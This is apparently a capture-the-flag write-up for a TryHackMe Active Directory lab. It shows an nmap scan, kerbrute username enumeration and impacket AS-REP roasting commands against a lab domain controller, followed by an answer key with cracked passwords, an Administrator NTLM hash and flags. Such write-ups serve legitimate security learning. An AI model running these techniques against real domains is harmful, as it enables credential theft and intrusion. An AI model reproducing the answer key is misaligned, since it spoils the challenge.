---
Machine Name : Active Directory
---

# ATTACKTIVE DIRECTORY

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/bc3749c26ec24501a38957e7869a9de1.png)

## NMAP SCAN

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-12-27 19:32:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-27T19:33:55+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-16T22:48:24
| Not valid after:  2021-03-18T22:48:24
| MD5:   dabe 7d5f 87d1 5ec6 a30a e736 1e37 0efc
|_SHA-1: 3747 b05a 96c8 92bf f443 0d51 bc70 a268 88b6 500c
|_ssl-date: 2020-12-27T19:34:03+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=12/27%OT=53%CT=1%CU=30626%PV=Y%DS=2%DC=T%G=Y%TM=5FE8E1
OS:AC%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%TS
OS:=U)SEQ(SP=104%GCD=1%ISR=106%TI=I%CI=I%II=I%TS=U)OPS(O1=M505NW8NNS%O2=M50
OS:5NW8NNS%O3=M505NW8%O4=M505NW8NNS%O5=M505NW8NNS%O6=M505NNS)WIN(W1=FFFF%W2
OS:=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M505NW8
OS:NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%
OS:S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(
OS:R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T
OS:=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RI
OS:D=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-12-27T19:33:55
|_  start_date: N/A

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   44.91 ms 10.9.0.1
2   45.02 ms 10.10.109.179
```

## PORT 88 KERBEROS ENUMERATION

### BRUTEFORCE WITH KERBRUTE

```text
kerbrute -users users.txt -domain spookysec.local -dc-ip 10.10.109.179
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/619d613276d84b148ea0cfc255648964.png)

### ASREPROAST

```text
impacket-GetNPUsers spookysec.local/ -usersfile roasting.txt -dc-ip 10.10.109.179
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/172217409aaa48be9f6d9c5ed6637855.png)

### DECRIPTING

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/6e4a663649a44f73b71d009e1a5cca2e.png)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/90bef727c91e4a8aba6430684e1bb318.png)

## SHARES ENUMERATION

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/734a30d7dc724748ab0a707e0d33e8ac.png)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/a0fa1d57a27d456c9046eb74387afa85.png)

## HASHDUMP

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/8bc2bf7408374ac78db589d0d78947e3.png)

## GETTIN SHELL

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/e04dede3157246b685209be25863266d.png)

## ANSWERS

* What tool will allow us to enumerate port 139/445?

  ```text
  enum4linux
  ```

* What is the NetBIOS-Domain Name of the machine?

  ```text
  THM-AD
  ```

* What invalid TLD do people commonly use for their Active Directory Domain?

  ```text
  .local
  ```

* What command within Kerbrute will allow us to enumerate valid usernames?

  ```text
  userenum
  ```

* What notable account is discovered? \(These should jump out at you\)

  ```text
  svc-admin
  ```

* What is the other notable account is discovered? \(These should jump out at you\)

  ```text
  backup
  ```

* We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?

  ```text
  svc-admin
  ```

* Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? \(Specify the full name\)

  ```text
  Kerberos 5 AS-REP etype 23
  ```

* What mode is the hash?

  ```text
  18200
  ```

* Now crack the hash with the modified password list provided, what is the user accounts password?

  ```text
  management2005
  ```

* Using utility can we map remote SMB shares?

  ```text
  smbclient
  ```

```text
- Which option will list shares?
-L
```

* How many remote shares is the server listing?

  ```text
  6
  ```

* There is one particular share that we have access to that contains a text file. Which share is it?

  ```text
  backup
  ```

* What is the content of the file?

  ```text
  YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
  ```

* Decoding the contents of the file, what is the full contents?

  ```text
  backup@spookysec.local:backup2517860
  ```

* What method allowed us to dump NTDS.DIT?

  ```text
  DRSUAPI
  ```

* What is the Administrators NTLM hash?

  ```text
  0e0363213e37b94221497260b0bcb4fc
  ```

* What method of attack could allow us to authenticate as the user without the password?

  ```text
  pass the hash
  ```

* Using a tool called Evil-WinRM what option will allow us to use a hash?

  ```text
  -H
  ```

* svc-admin

  ```text
  TryHackMe{K3rb3r0s_Pr3_4uth}
  ```

* backup

  ```text
  TryHackMe{B4ckM3UpSc0tty!}
  ```

* Administrator

  ```text
  TryHackMe{4ctiveD1rectoryM4st3r}
  ```
